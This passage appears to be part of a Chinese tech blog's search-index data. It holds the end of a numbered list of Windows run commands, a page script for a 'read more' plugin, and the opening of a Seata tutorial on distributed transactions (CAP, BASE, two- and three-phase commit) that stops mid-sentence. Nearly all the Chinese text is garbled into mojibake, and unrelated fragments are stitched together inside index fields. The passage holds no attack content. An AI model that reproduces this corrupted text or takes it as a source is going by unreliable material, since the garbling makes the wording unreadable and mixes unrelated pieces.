-anï¼š(TC)å‘½ä»¤æ£€æŸ¥æ¥å£73. syncappï¼šåˆ›å»ºä¸€ä¸ªå…¬æ–‡åŒ…74. syseditï¼šç³»ç»Ÿé…ç½®ç¼–è¾‘å™¨75. sigverifï¼šæ–‡ä»¶ç­¾åéªŒè¯ç¨‹åº76. ciadv.mscï¼šç´¢å¼•æœåŠ¡ç¨‹åº77. shrpubwï¼šåˆ›å»ºå…±äº«æ–‡ä»¶å¤¹78. secpol.mscï¼šæœ¬åœ°å®‰å…¨ç­–ç•¥79. syskeyï¼šç³»ç»ŸåŠ å¯†ï¼Œä¸€æ—¦åŠ å¯†å°±ä¸èƒ½è§£å¼€ï¼Œä¿æŠ¤windows xpç³»ç»Ÿçš„åŒé‡å¯†ç 80. services.mscï¼šæœ¬åœ°æœåŠ¡è®¾ç½®81. Sndvol32ï¼šéŸ³é‡æ§åˆ¶ç¨‹åº82. sfc.exeï¼šç³»ç»Ÿæ–‡ä»¶æ£€æŸ¥å™¨83. sfc /scannowï¼šwindowsæ–‡ä»¶ä¿æŠ¤84. ciadv.mscï¼šç´¢å¼•æœåŠ¡ç¨‹åº85. tourstartï¼šxpç®€ä»‹ï¼ˆå®‰è£…å®Œæˆåå‡ºç°çš„æ¼«æ¸¸xpç¨‹åºï¼‰86. taskmgrï¼šä»»åŠ¡ç®¡ç†å™¨87. eventvwrï¼šäº‹ä»¶æŸ¥çœ‹å™¨88. eudceditï¼šé€ å­—ç¨‹åº89. compmgmt.mscï¼šè®¡ç®—æœºç®¡ç†90. packagerï¼šå¯¹è±¡åŒ…è£…ç¨‹åº91. perfmon.mscï¼šè®¡ç®—æœºæ€§èƒ½ç›‘æµ‹ç¨‹åº92. charmapï¼šå¯åŠ¨å­—ç¬¦æ˜ å°„è¡¨93. cliconfgï¼šSQL SERVER å®¢æˆ·ç«¯ç½‘ç»œå®ç”¨ç¨‹åº94. Clipbrdï¼šå‰ªè´´æ¿æŸ¥çœ‹å™¨95. confï¼šå¯åŠ¨netmeeting96. certmgr.mscï¼šè¯ä¹¦ç®¡ç†å®ç”¨ç¨‹åº97. regsvr32 /u *.dllï¼šåœæ­¢dllæ–‡ä»¶è¿è¡Œ98. regsvr32 /u zipfldr.dllï¼šå–æ¶ˆZIPæ”¯æŒ99. cmd.exeï¼šCMDå‘½ä»¤æç¤ºç¬¦100. chkdsk.exeï¼šç£ç›˜æ£€æŸ¥ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"windowsç³»ç»Ÿ"},{title:"Seata å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/e8b71fbe.html",text:'å‰è¨€æœ¯è¯­ TX åè®®ï¼šåº”ç”¨æˆ–è€…åº”ç”¨æœåŠ¡å™¨ä¸äº‹åŠ¡ç®¡ç†å™¨çš„æ¥å£ XA åè®®ï¼šå…¨å±€äº‹åŠ¡ç®¡ç†å™¨ä¸èµ„æºç®¡ç†å™¨çš„æ¥å£ã€‚XA æ˜¯ç”± X/Open ç»„ç»‡æå‡ºçš„åˆ†å¸ƒå¼äº‹åŠ¡è§„èŒƒï¼Œè¯¥è§„èŒƒä¸»è¦å®šä¹‰äº†å…¨å±€äº‹åŠ¡ç®¡ç†å™¨å’Œå±€éƒ¨èµ„æºç®¡ç†å™¨ä¹‹é—´çš„æ¥å£ï¼Œä¸»æµçš„æ•°æ®åº“äº§å“éƒ½å®ç°äº† XA æ¥å£ã€‚XA æ¥å£æ˜¯ä¸€ä¸ªåŒå‘çš„ç³»ç»Ÿæ¥å£ï¼Œåœ¨äº‹åŠ¡ç®¡ç†å™¨ä»¥åŠå¤šä¸ªèµ„æºç®¡ç†å™¨ä¹‹é—´ä½œä¸ºé€šä¿¡æ¡¥æ¢ã€‚ä¹‹æ‰€ä»¥éœ€è¦ XA æ˜¯å› ä¸ºåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä»ç†è®ºä¸Šè®²ä¸¤å°æœºå™¨æ˜¯æ— æ³•è¾¾åˆ°ä¸€è‡´æ€§çŠ¶æ€çš„ï¼Œå› æ­¤å¼•å…¥ä¸€ä¸ªå•ç‚¹è¿›è¡Œåè°ƒã€‚ç”±å…¨å±€äº‹åŠ¡ç®¡ç†å™¨ç®¡ç†å’Œåè°ƒçš„äº‹åŠ¡å¯ä»¥è·¨è¶Šå¤šä¸ªèµ„æºå’Œè¿›ç¨‹ã€‚å…¨å±€äº‹åŠ¡ç®¡ç†å™¨ä¸€èˆ¬ä½¿ç”¨ XA äºŒé˜¶æ®µåè®®ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ã€‚ åˆ†å¸ƒå¼ç†è®ºCAP ç†è®ºï¼š CAP å®šç†æ˜¯ç”±åŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ ¡ Eric Brewer æ•™æˆæå‡ºæ¥çš„ï¼Œä»–æŒ‡å‡º WEB æœåŠ¡æ— æ³•åŒæ—¶æ»¡è¶³ä¸€ä¸‹ä¸‰ä¸ªå±æ€§ï¼š ä¸€è‡´æ€§ (Consistency)ï¼šå®¢æˆ·ç«¯çŸ¥é“ä¸€ç³»åˆ—çš„æ“ä½œéƒ½ä¼šåŒæ—¶å‘ç”Ÿ (ç”Ÿæ•ˆ) å¯ç”¨æ€§ (Availability)ï¼šæ¯ä¸ªæ“ä½œéƒ½å¿…é¡»ä»¥å¯é¢„æœŸçš„å“åº”ç»“æŸ åˆ†åŒºå®¹é”™æ€§ (Partition tolerance)ï¼šå³ä½¿å‡ºç°å•ä¸ªç»„ä»¶æ— æ³•å¯ç”¨ï¼Œæ“ä½œä¾ç„¶å¯ä»¥å®Œæˆ å…·ä½“åœ°è®²åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œä»»ä½•æ•°æ®åº“è®¾è®¡æˆ–è€… Web åº”ç”¨è‡³å¤šåªèƒ½åŒæ—¶æ”¯æŒä¸Šé¢çš„ä¸¤ä¸ªå±æ€§ã€‚æ˜¾ç„¶ï¼Œä»»ä½•æ¨ªå‘æ‰©å±•ç­–ç•¥éƒ½è¦ä¾èµ–äºæ•°æ®åˆ†åŒºã€‚å› æ­¤ï¼Œè®¾è®¡äººå‘˜å¿…é¡»åœ¨ä¸€è‡´æ€§ä¸å¯ç”¨æ€§ä¹‹é—´åšå‡ºé€‰æ‹©ã€‚ BASE ç†è®ºï¼š åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå¾€å¾€è¿½æ±‚çš„æ˜¯å¯ç”¨æ€§ï¼Œå®ƒçš„é‡è¦ç¨‹åºæ¯”ä¸€è‡´æ€§è¦é«˜ï¼Œé‚£ä¹ˆå¦‚ä½•å®ç°é«˜å¯ç”¨æ€§å‘¢ï¼Ÿå‰äººå·²ç»ç»™æˆ‘ä»¬æå‡ºæ¥äº†å¦å¤–ä¸€ä¸ªç†è®ºï¼Œå°±æ˜¯ BASE ç†è®ºï¼Œå®ƒæ˜¯ç”¨æ¥å¯¹ CAP å®šç†è¿›è¡Œè¿›ä¸€æ­¥æ‰©å……çš„ã€‚BASE ç†è®ºæŒ‡çš„æ˜¯ï¼š Basically Availableï¼ˆåŸºæœ¬å¯ç”¨ï¼‰ Soft stateï¼ˆè½¯çŠ¶æ€ï¼‰ Eventually consistentï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰ BASE ç†è®ºæ˜¯å¯¹ CAP ä¸­çš„ä¸€è‡´æ€§å’Œå¯ç”¨æ€§è¿›è¡Œä¸€ä¸ªæƒè¡¡çš„ç»“æœï¼Œç†è®ºçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯ï¼šæ— æ³•åšåˆ°å¼ºä¸€è‡´ï¼Œä½†æ¯ä¸ªåº”ç”¨éƒ½å¯ä»¥æ ¹æ®è‡ªèº«çš„ä¸šåŠ¡ç‰¹ç‚¹ï¼Œé‡‡ç”¨é€‚å½“çš„æ–¹å¼æ¥ä½¿ç³»ç»Ÿè¾¾åˆ°æœ€ç»ˆä¸€è‡´æ€§ï¼ˆEventual consistencyï¼‰ã€‚ é…¸ç¢±å¹³è¡¡ï¼š ACID èƒ½å¤Ÿä¿è¯äº‹åŠ¡çš„å¼ºä¸€è‡´æ€§ï¼Œå³æ•°æ®æ˜¯å®æ—¶ä¸€è‡´çš„ï¼Œè¿™åœ¨æœ¬åœ°äº‹åŠ¡ä¸­æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚åœ¨åˆ†å¸ƒå¼äº‹åŠ¡ä¸­ï¼Œå¼ºä¸€è‡´æ€§ä¼šæå¤§å½±å“åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ€§èƒ½ï¼Œå› æ­¤åˆ†å¸ƒå¼ç³»ç»Ÿä¸­éµå¾ª BASE ç†è®ºå³å¯ã€‚ä½†åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸åŒä¸šåŠ¡åœºæ™¯å¯¹ä¸€è‡´æ€§çš„è¦æ±‚ä¹Ÿä¸åŒã€‚å¦‚äº¤æ˜“åœºæ™¯ä¸‹ï¼Œå°±è¦æ±‚å¼ºä¸€è‡´æ€§ï¼Œæ­¤æ—¶å°±éœ€è¦éµå¾ª ACID ç†è®ºï¼Œè€Œåœ¨æ³¨å†ŒæˆåŠŸåå‘é€çŸ­ä¿¡éªŒè¯ç ç­‰åœºæ™¯ä¸‹ï¼Œå¹¶ä¸éœ€è¦å®æ—¶ä¸€è‡´ï¼Œå› æ­¤éµå¾ª BASE ç†è®ºå³å¯ã€‚å› æ­¤è¦æ ¹æ®å…·ä½“ä¸šåŠ¡åœºæ™¯ï¼Œåœ¨ ACID å’Œ BASE ä¹‹é—´å¯»æ±‚å¹³è¡¡ã€‚ åˆ†å¸ƒå¼äº‹åŠ¡åŸºç¡€äº‹åŠ¡äº‹åŠ¡æŒ‡çš„å°±æ˜¯ä¸€ä¸ªæ“ä½œå•å…ƒï¼Œåœ¨è¿™ä¸ªæ“ä½œå•å…ƒä¸­çš„æ‰€æœ‰æ“ä½œæœ€ç»ˆè¦ä¿æŒä¸€è‡´çš„è¡Œä¸ºï¼Œè¦ä¹ˆæ‰€æœ‰æ“éƒ½æˆåŠŸï¼Œè¦ä¹ˆæ‰€æœ‰çš„æ“ä½œéƒ½è¢«æ’¤é”€ã€‚ç®€å•åœ°è¯´ï¼Œäº‹åŠ¡æä¾›ä¸€ç§â€ è¦ä¹ˆä»€ä¹ˆéƒ½ä¸åšï¼Œè¦ä¹ˆåšå…¨å¥— â€œæœºåˆ¶ã€‚ æœ¬åœ°äº‹åŠ¡æœ¬åœ°äº‹åŠ¡å…¶å®å¯ä»¥è®¤ä¸ºæ˜¯æ•°æ®åº“æä¾›çš„äº‹åŠ¡æœºåˆ¶ã€‚è¯´åˆ°æ•°æ®åº“äº‹åŠ¡å°±ä¸å¾—ä¸è¯´ï¼Œæ•°æ®åº“äº‹åŠ¡ä¸­çš„å››å¤§ç‰¹æ€§ï¼ˆACIDï¼‰ï¼š Aï¼šåŸå­æ€§ï¼ˆAtomicityï¼‰ï¼Œä¸€ä¸ªäº‹åŠ¡ä¸­çš„æ‰€æœ‰æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå…¨éƒ¨ä¸å®Œæˆ Cï¼šä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼Œåœ¨ä¸€ä¸ªäº‹åŠ¡æ‰§è¡Œä¹‹å‰å’Œæ‰§è¡Œä¹‹åæ•°æ®åº“éƒ½å¿…é¡»å¤„äºä¸€è‡´æ€§çŠ¶æ€ Iï¼šéš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼Œåœ¨å¹¶å‘ç¯å¢ƒä¸­ï¼Œå½“ä¸åŒçš„äº‹åŠ¡åŒæ—¶æ“ä½œç›¸åŒçš„æ•°æ®æ—¶ï¼Œäº‹åŠ¡ä¹‹é—´äº’ä¸å½±å“ Dï¼šæŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼ŒæŒ‡çš„æ˜¯åªè¦äº‹åŠ¡æˆåŠŸç»“æŸï¼Œå®ƒå¯¹æ•°æ®åº“æ‰€åšçš„æ›´æ–°å°±å¿…é¡»æ°¸ä¹…çš„ä¿å­˜ä¸‹æ¥ æ•°æ®åº“äº‹åŠ¡åœ¨å®ç°æ—¶ä¼šå°†ä¸€æ¬¡äº‹åŠ¡æ¶‰åŠçš„æ‰€æœ‰æ“ä½œå…¨éƒ¨çº³å…¥åˆ°ä¸€ä¸ªä¸å¯åˆ†å‰²çš„æ‰§è¡Œå•å…ƒï¼Œè¯¥æ‰§è¡Œå•å…ƒä¸­çš„æ‰€æœ‰æ“ä½œè¦ä¹ˆéƒ½æˆåŠŸï¼Œè¦ä¹ˆéƒ½å¤±è´¥ï¼Œåªè¦å…¶ä¸­ä»»ä¸€æ“ä½œæ‰§è¡Œå¤±è´¥ï¼Œéƒ½å°†å¯¼è‡´æ•´ä¸ªäº‹åŠ¡çš„å›æ»šã€‚ åˆ†å¸ƒå¼äº‹åŠ¡åˆ†å¸ƒå¼äº‹åŠ¡æŒ‡äº‹åŠ¡çš„å‚ä¸è€…ã€æ”¯æŒäº‹åŠ¡çš„æœåŠ¡å™¨ã€èµ„æºæœåŠ¡å™¨ä»¥åŠäº‹åŠ¡ç®¡ç†å™¨åˆ†åˆ«ä½äºä¸åŒçš„åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸åŒèŠ‚ç‚¹ä¹‹ä¸Šã€‚ç®€å•çš„è¯´ï¼Œå°±æ˜¯ä¸€æ¬¡å¤§çš„æ“ä½œç”±ä¸åŒçš„å°æ“ä½œç»„æˆï¼Œè¿™äº›å°çš„æ“ä½œåˆ†å¸ƒåœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œä¸”å±äºä¸åŒçš„åº”ç”¨ï¼Œåˆ†å¸ƒå¼äº‹åŠ¡éœ€è¦ä¿è¯è¿™äº›å°æ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ã€‚æœ¬è´¨ä¸Šæ¥è¯´ï¼Œåˆ†å¸ƒå¼äº‹åŠ¡å°±æ˜¯ä¸ºäº†ä¿è¯ä¸åŒæ•°æ®åº“çš„æ•°æ®ä¸€è‡´æ€§ã€‚ä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯ï¼Œä¸€æ¬¡ä¸šåŠ¡æ“ä½œéœ€è¦è·¨å¤šä¸ªæ•°æ®æºæˆ–è€…éœ€è¦è·¨å¤šä¸ªç³»ç»Ÿè¿›è¡Œè¿œç¨‹è°ƒç”¨ï¼Œå°±ä¼šäº§ç”Ÿåˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜ã€‚ åˆ†å¸ƒå¼äº‹åŠ¡çš„åœºæ™¯ å•ä½“ç³»ç»Ÿè®¿é—®å¤šä¸ªæ•°æ®åº“ï¼šä¸€ä¸ªæœåŠ¡éœ€è¦è°ƒç”¨å¤šä¸ªæ•°æ®åº“å®ä¾‹å®Œæˆæ•°æ®çš„å¢åˆ æ”¹æ“ä½œ å¤šä¸ªå¾®æœåŠ¡è®¿é—®åŒä¸€ä¸ªæ•°æ®åº“ï¼šå¤šä¸ªæœåŠ¡éœ€è¦è°ƒç”¨ä¸€ä¸ªæ•°æ®åº“å®ä¾‹å®Œæˆæ•°æ®çš„å¢åˆ æ”¹æ“ä½œ å¤šä¸ªå¾®æœåŠ¡è®¿é—®å¤šä¸ªæ•°æ®åº“ï¼šå¤šä¸ªæœåŠ¡éœ€è¦è°ƒç”¨ä¸€ä¸ªæ•°æ®åº“å®ä¾‹å®Œæˆæ•°æ®çš„å¢åˆ æ”¹æ“ä½œ åˆ†å¸ƒå¼äº‹åŠ¡åè®®ä¸¤é˜¶æ®µæäº¤åè®®ï¼ˆ2PCï¼‰åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸€ä¸ªéš¾ç‚¹æ˜¯å¦‚ä½•ä¿è¯æ¶æ„ä¸‹å¤šä¸ªèŠ‚ç‚¹åœ¨è¿›è¡Œäº‹åŠ¡æ€§æ“ä½œçš„æ—¶å€™ä¿æŒä¸€è‡´æ€§ã€‚ä¸ºå®ç°è¿™ä¸ªç›®çš„ï¼ŒäºŒé˜¶æ®µæäº¤ç®—æ³•çš„æˆç«‹åŸºäºä»¥ä¸‹å‡è®¾ï¼š è¯¥åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä½œä¸ºåè°ƒè€…ï¼ˆCoordinatorï¼‰ï¼Œå…¶ä»–èŠ‚ç‚¹ä½œä¸ºå‚ä¸è€…ï¼ˆCohortsï¼‰ï¼Œä¸”èŠ‚ç‚¹ä¹‹é—´å¯ä»¥è¿›è¡Œç½‘ç»œé€šä¿¡ æ‰€æœ‰èŠ‚ç‚¹éƒ½é‡‡ç”¨é¢„å†™å¼æ—¥å¿—ï¼Œä¸”æ—¥å¿—è¢«å†™å…¥åå³è¢«ä¿æŒåœ¨å¯é çš„å­˜å‚¨è®¾å¤‡ä¸Šï¼Œå³ä½¿èŠ‚ç‚¹æŸåä¸ä¼šå¯¼è‡´æ—¥å¿—æ•°æ®çš„æ¶ˆå¤± æ‰€æœ‰èŠ‚ç‚¹ä¸ä¼šæ°¸ä¹…æ€§æŸåï¼Œå³ä½¿æŸååä»ç„¶å¯ä»¥æ¢å¤ ç¬¬ä¸€é˜¶æ®µï¼ˆæŠ•ç¥¨é˜¶æ®µï¼‰: åè°ƒè€…èŠ‚ç‚¹å‘æ‰€æœ‰å‚ä¸è€…èŠ‚ç‚¹è¯¢é—®æ˜¯å¦å¯ä»¥æ‰§è¡Œæäº¤æ“ä½œï¼ˆvoteï¼‰ï¼Œå¹¶å¼€å§‹ç­‰å¾…å„å‚ä¸è€…èŠ‚ç‚¹çš„å“åº” å‚ä¸è€…èŠ‚ç‚¹æ‰§è¡Œè¯¢é—®å‘èµ·ä¸ºæ­¢çš„æ‰€æœ‰äº‹åŠ¡æ“ä½œï¼Œå¹¶å°† Undo ä¿¡æ¯å’Œ Redo ä¿¡æ¯å†™å…¥æ—¥å¿—ï¼ˆæ³¨æ„ï¼šè‹¥æˆåŠŸè¿™é‡Œå…¶å®æ¯ä¸ªå‚ä¸è€…å·²ç»æ‰§è¡Œäº†äº‹åŠ¡æ“ä½œï¼‰ å„å‚ä¸è€…èŠ‚ç‚¹å“åº”åè°ƒè€…èŠ‚ç‚¹å‘èµ·çš„è¯¢é—®ï¼Œå¦‚æœå‚ä¸è€…èŠ‚ç‚¹çš„äº‹åŠ¡æ“ä½œå®é™…æ‰§è¡ŒæˆåŠŸï¼Œåˆ™å®ƒè¿”å›ä¸€ä¸ªâ€ åŒæ„â€ æ¶ˆæ¯ï¼›å¦‚æœå‚ä¸è€…èŠ‚ç‚¹çš„äº‹åŠ¡æ“ä½œå®é™…æ‰§è¡Œå¤±è´¥ï¼Œåˆ™å®ƒè¿”å›ä¸€ä¸ªâ€ ä¸­æ­¢â€ æ¶ˆæ¯ ç¬¬äºŒé˜¶æ®µï¼ˆæäº¤æ‰§è¡Œé˜¶æ®µï¼‰ï¼š å½“åè°ƒè€…èŠ‚ç‚¹ä»æ‰€æœ‰å‚ä¸è€…èŠ‚ç‚¹è·å¾—çš„ç›¸åº”æ¶ˆæ¯éƒ½ä¸ºâ€ åŒæ„â€ æ—¶ï¼š åè°ƒè€…èŠ‚ç‚¹å‘æ‰€æœ‰å‚ä¸è€…èŠ‚ç‚¹å‘å‡ºâ€ æ­£å¼æäº¤ï¼ˆCommitï¼‰â€ çš„è¯·æ±‚ å‚ä¸è€…èŠ‚ç‚¹æ­£å¼å®Œæˆæ“ä½œï¼Œå¹¶é‡Šæ”¾åœ¨æ•´ä¸ªäº‹åŠ¡æœŸé—´å†…å ç”¨çš„èµ„æº å‚ä¸è€…èŠ‚ç‚¹å‘åè°ƒè€…èŠ‚ç‚¹å‘é€â€ å®Œæˆâ€ æ¶ˆæ¯ åè°ƒè€…èŠ‚ç‚¹å—åˆ°æ‰€æœ‰å‚ä¸è€…èŠ‚ç‚¹åé¦ˆçš„â€ å®Œæˆâ€ æ¶ˆæ¯åï¼Œå®Œæˆäº‹åŠ¡ ä¸­æ–­äº‹åŠ¡ï¼š å¦‚æœä»»ä¸€å‚ä¸è€…èŠ‚ç‚¹åœ¨ç¬¬ä¸€é˜¶æ®µè¿”å›çš„å“åº”æ¶ˆæ¯ä¸ºâ€ ä¸­æ­¢â€ï¼Œæˆ–è€…åè°ƒè€…èŠ‚ç‚¹åœ¨ç¬¬ä¸€é˜¶æ®µçš„è¯¢é—®è¶…æ—¶ä¹‹å‰æ— æ³•è·å–æ‰€æœ‰å‚ä¸è€…èŠ‚ç‚¹çš„å“åº”æ¶ˆæ¯æ—¶ï¼š åè°ƒè€…èŠ‚ç‚¹å‘æ‰€æœ‰å‚ä¸è€…èŠ‚ç‚¹å‘å‡ºâ€ å›æ»šæ“ä½œï¼ˆRollbackï¼‰â€ çš„è¯·æ±‚ å‚ä¸è€…èŠ‚ç‚¹åˆ©ç”¨ä¹‹å‰å†™å…¥çš„ Undo ä¿¡æ¯æ‰§è¡Œå›æ»šï¼Œå¹¶é‡Šæ”¾åœ¨æ•´ä¸ªäº‹åŠ¡æœŸé—´å†…å ç”¨çš„èµ„æº å‚ä¸è€…èŠ‚ç‚¹å‘åè°ƒè€…èŠ‚ç‚¹å‘é€â€ å›æ»šå®Œæˆâ€ æ¶ˆæ¯ åè°ƒè€…èŠ‚ç‚¹å—åˆ°æ‰€æœ‰å‚ä¸è€…èŠ‚ç‚¹åé¦ˆçš„â€ å›æ»šå®Œæˆâ€ æ¶ˆæ¯åï¼Œå–æ¶ˆäº‹åŠ¡ ç‰¹åˆ«æ³¨æ„ï¼šä¸ç®¡æœ€åç»“æœå¦‚ä½•ï¼Œç¬¬äºŒé˜¶æ®µéƒ½ä¼šç»“æŸå½“å‰äº‹åŠ¡ äºŒé˜¶æ®µæäº¤çš„ç¼ºç‚¹ï¼š èµ„æºé˜»å¡ï¼šæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰å‚ä¸èŠ‚ç‚¹éƒ½æ˜¯äº‹åŠ¡é˜»å¡å‹çš„ã€‚å½“å‚ä¸è€…å æœ‰å…¬å…±èµ„æºæ—¶ï¼Œå…¶ä»–ç¬¬ä¸‰æ–¹èŠ‚ç‚¹è®¿é—®å…¬å…±èµ„æºä¸å¾—ä¸å¤„äºé˜»å¡çŠ¶æ€ å‚ä¸è€…å‘ç”Ÿæ•…éšœï¼šåè°ƒè€…éœ€è¦ç»™æ¯ä¸ªå‚ä¸è€…é¢å¤–æŒ‡å®šè¶…æ—¶æœºåˆ¶ï¼Œè¶…æ—¶åæ•´ä¸ªäº‹åŠ¡å¤±è´¥ï¼ˆæ²¡æœ‰å¤šå°‘å®¹é”™æœºåˆ¶ï¼‰ åè°ƒè€…å‘ç”Ÿæ•…éšœï¼šå‚ä¸è€…ä¼šä¸€ç›´é˜»å¡ä¸‹å»ã€‚éœ€è¦é¢å¤–çš„å¤‡æœºè¿›è¡Œå®¹é”™ï¼ˆè¿™ä¸ªå¯ä»¥ä¾èµ– Paxos åè®®å®ç° HAï¼‰ äºŒé˜¶æ®µæ— æ³•è§£å†³çš„é—®é¢˜ï¼šåè°ƒè€…å†å‘å‡º Commit æ¶ˆæ¯ä¹‹åå®•æœºï¼Œè€Œå”¯ä¸€æ¥æ”¶åˆ°è¿™æ¡æ¶ˆæ¯çš„å‚ä¸è€…åŒæ—¶ä¹Ÿå®•æœºäº†ã€‚é‚£ä¹ˆå³ä½¿åè°ƒè€…é€šè¿‡é€‰ä¸¾åè®®äº§ç”Ÿäº†æ–°çš„åè°ƒè€…ï¼Œè¿™æ¡äº‹åŠ¡çš„çŠ¶æ€ä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼Œæ²¡äººçŸ¥é“äº‹åŠ¡æ˜¯å¦å·²ç»è¢«æäº¤æˆåŠŸï¼Œè¿™æœ‰å¯èƒ½å¯¼è‡´æ•°æ®ä¸ä¸€è‡´ ä¸‰é˜¶æ®µæäº¤åè®®ï¼ˆ3PCï¼‰ä¸ä¸¤é˜¶æ®µæäº¤ä¸åŒçš„æ˜¯ï¼Œä¸‰é˜¶æ®µæäº¤æœ‰ä¸¤ä¸ªæ”¹åŠ¨ç‚¹ï¼š å¼•å…¥è¶…æ—¶æœºåˆ¶ã€‚åŒæ—¶åœ¨åè°ƒè€…å’Œå‚ä¸è€…ä¸­éƒ½å¼•å…¥è¶…æ—¶æœºåˆ¶ åœ¨ç¬¬ä¸€é˜¶æ®µå’Œç¬¬äºŒé˜¶æ®µä¸­æ’å…¥ä¸€ä¸ªå‡†å¤‡é˜¶æ®µï¼Œä¿è¯äº†åœ¨æœ€åæäº¤é˜¶æ®µä¹‹å‰å„å‚ä¸èŠ‚ç‚¹çš„çŠ¶æ€æ˜¯ä¸€è‡´çš„ ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤äº†å¼•å…¥è¶…æ—¶æœºåˆ¶ä¹‹å¤–ï¼Œ3PC æŠŠ 2PC çš„å‡†å¤‡é˜¶æ®µå†æ¬¡ä¸€åˆ†ä¸ºäºŒï¼Œè¿™æ ·ä¸‰é˜¶æ®µæäº¤å°±æœ‰ CanCommitã€PreCommitã€DoCommit ä¸‰ä¸ªé˜¶æ®µ. CanCommit é˜¶æ®µï¼š 3PC çš„ CanCommit é˜¶æ®µå…¶å®å’Œ 2PC çš„å‡†å¤‡é˜¶æ®µå¾ˆåƒã€‚åè°ƒè€…å‘å‚ä¸è€…å‘é€ Commit è¯·æ±‚ï¼Œå‚ä¸è€…å¦‚æœå¯ä»¥æäº¤å°±è¿”å› Yes å“åº”ï¼Œå¦åˆ™è¿”å› No å“åº”ï¼š äº‹åŠ¡è¯¢é—®ï¼šåè°ƒè€…å‘å‚ä¸è€…å‘é€ CanCommit è¯·æ±‚ã€‚è¯¢é—®æ˜¯å¦å¯ä»¥æ‰§è¡Œäº‹åŠ¡æäº¤æ“ä½œã€‚ç„¶åå¼€å§‹ç­‰å¾…å‚ä¸è€…çš„å“åº” å“åº”åé¦ˆï¼šå‚ä¸è€…æ¥åˆ° CanCommit è¯·æ±‚ä¹‹åï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœå…¶è‡ªèº«è®¤ä¸ºå¯ä»¥é¡ºåˆ©æ‰§è¡Œäº‹åŠ¡ï¼Œåˆ™è¿”å› Yes å“åº”ï¼Œå¹¶è¿›å…¥é¢„å¤‡çŠ¶æ€ï¼Œå¦åˆ™åé¦ˆ No PreCommit é˜¶æ®µï¼š åè°ƒè€…æ ¹æ®å‚ä¸è€…çš„ååº”æƒ…å†µæ¥å†³å®šæ˜¯å¦å¯ä»¥æ‰§è¡Œäº‹åŠ¡çš„ PreCommit æ“ä½œã€‚æ ¹æ®å“åº”æƒ…å†µï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§å¯èƒ½ï¼š å‡å¦‚åè°ƒè€…ä»æ‰€æœ‰çš„å‚ä¸è€…è·å¾—çš„åé¦ˆéƒ½æ˜¯ Yes å“åº”ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œäº‹åŠ¡çš„é¢„æ‰§è¡Œ å‘é€é¢„æäº¤è¯·æ±‚ï¼šåè°ƒè€…å‘å‚ä¸è€…å‘é€ PreCommit è¯·æ±‚åï¼Œå¹¶è¿›å…¥ Prepared é˜¶æ®µ äº‹åŠ¡é¢„æäº¤ï¼šå‚ä¸è€…æ¥æ”¶åˆ° PreCommit è¯·æ±‚åï¼Œä¼šæ‰§è¡Œäº‹åŠ¡æ“ä½œï¼Œå¹¶å°† Undo å’Œ Redo ä¿¡æ¯è®°å½•åˆ°äº‹åŠ¡æ—¥å¿—ä¸­ å“åº”åé¦ˆï¼šå¦‚æœå‚ä¸è€…æˆåŠŸçš„æ‰§è¡Œäº†äº‹åŠ¡æ“ä½œï¼Œåˆ™è¿”å› ACK å“åº”ï¼ŒåŒæ—¶å¼€å§‹ç­‰å¾…æœ€ç»ˆæŒ‡ä»¤ å‡å¦‚æœ‰ä»»ä½•ä¸€ä¸ªå‚ä¸è€…å‘åè°ƒè€…å‘é€äº† No å“åº”ï¼Œæˆ–è€…ç­‰å¾…è¶…æ—¶ä¹‹åï¼Œåè°ƒè€…éƒ½æ²¡æœ‰æ¥åˆ°å‚ä¸è€…çš„å“åº”ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œäº‹åŠ¡çš„ä¸­æ–­ å‘é€ä¸­æ–­è¯·æ±‚ï¼šåè°ƒè€…å‘æ‰€æœ‰å‚ä¸è€…å‘é€ Abort è¯·æ±‚ ä¸­æ–­äº‹åŠ¡ï¼šå‚ä¸è€…æ”¶åˆ°æ¥è‡ªåè°ƒè€…çš„ Abort 